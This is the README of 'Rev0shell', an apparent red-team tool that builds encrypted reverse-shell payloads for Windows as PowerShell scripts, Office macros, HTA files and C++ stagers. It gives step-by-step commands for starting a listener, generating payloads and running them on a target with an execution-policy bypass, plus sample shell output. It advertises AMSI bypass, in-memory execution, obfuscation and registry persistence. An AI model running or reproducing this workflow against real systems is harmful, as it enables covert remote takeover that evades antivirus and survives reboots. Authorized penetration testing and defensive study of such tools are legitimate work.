
# Rev0shell

A lightweight, AES-encrypted reverse shell handler with AMSI bypass and Windows persistence for authorized security testing and red team operations.

---

## Features

- AES-256 encrypted payload delivery
- AMSI bypass at runtime
- Memory-only execution (no disk write)
- Registry persistence (survives reboot)
- Obfuscated PowerShell output
- Multi-format: PowerShell, VBA Macro, HTA, C++ EXE
- Cross-platform: Kali Linux to Windows 10/11

---

## Installation

Clone the repository:

git clone https://github.com/Luscious8/Rev0shell.git
cd Rev0shell
Install dependencies (optional, for encryption and colored output):
pip install -r requirements.txt
Or install manually:
pip install rich pycryptodome

┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐
│ Rev0shell│────▶│Payload │────▶│Target   │────▶│Listener│
│ (Kali)  │     │Encrypted│     │Decrypts │     │Gets    │
└─────────┘     └─────────┘     └─────────┘     └─────────┘
                     │               │               │
                     ▼               ▼               ▼
                 AES-256          AMSI            Reverse
                 Encrypted        Bypass           Shell

---

## Usage

Start a listener:

python rev0shell.py --lhost 192.168.1.6 --lport 4444
Generate a PowerShell payload:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate
Generate VBA macro for Excel or Word:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --macro
Generate HTA payload:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --hta
Generate C++ stager executable:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --exe
Specify custom output file:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output custom.ps1
Use custom encryption key:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --key MySecretKey123

---

## Command Reference

--lhost       Listener IP address (required)
--lport       Listener port (required)
--key         Custom encryption key (default: REV0SHELL2026)
--generate    Generate PowerShell payload
--macro       Generate VBA macro for Excel/Word
--hta         Generate HTA payload
--exe         Generate C++ stager EXE
--output      Output file name
--help        Show help message

---

## Example Workflow

Terminal 1 (Kali) - Start listener:
python rev0shell.py --lhost 192.168.1.6 --lport 4444
Terminal 2 (Kali) - Generate payload:
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output shell.ps1
On Windows target - Execute payload:
powershell -ExecutionPolicy Bypass -File shell.ps1

Expected output:

[*] Listening on 192.168.1.6:4444
[+] Connection received from 192.168.1.105:49732
PS C:\Users\victor>

---

## Output Files

payload.ps1     PowerShell reverse shell
macro.txt       VBA code for Excel/Word
payload.hta     HTA application
stager.exe      Compiled C++ stager
unicorn.rc      Metasploit resource file

---

## How It Works

1. Rev0shell generates an AES-encrypted PowerShell script
2. Random variable names and junk code are added for obfuscation
3. The payload is transferred to the target
4. Payload decrypts itself in memory
5. AMSI bypass disables PowerShell scanning
6. Reverse shell connects to the listener
7. Registry key is added for persistence

---

## Requirements

- Python 3.8 or higher
- Kali Linux (recommended) or any Linux distribution
- Windows 10 or Windows 11 target for testing
- Metasploit (optional, for advanced payloads)

---

## File Structure

Rev0shell/
├── rev0shell.py      # Main script
├── requirements.txt  # Python dependencies
├── README.md         # Documentation
└── LICENSE           # MIT License

---

## Disclaimer

This tool is for educational and authorized security testing purposes only.

Do not use on any system without explicit written permission from the owner. Unauthorized access is illegal and unethical. The author assumes no liability for misuse or damage caused by this tool.

By using this software, you agree that you have explicit written permission to test any target system.

---

## License

MIT License

Copyright (c) 2026 Luscious8

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## Author
Security research for authorized red team operations and defensive training.
```
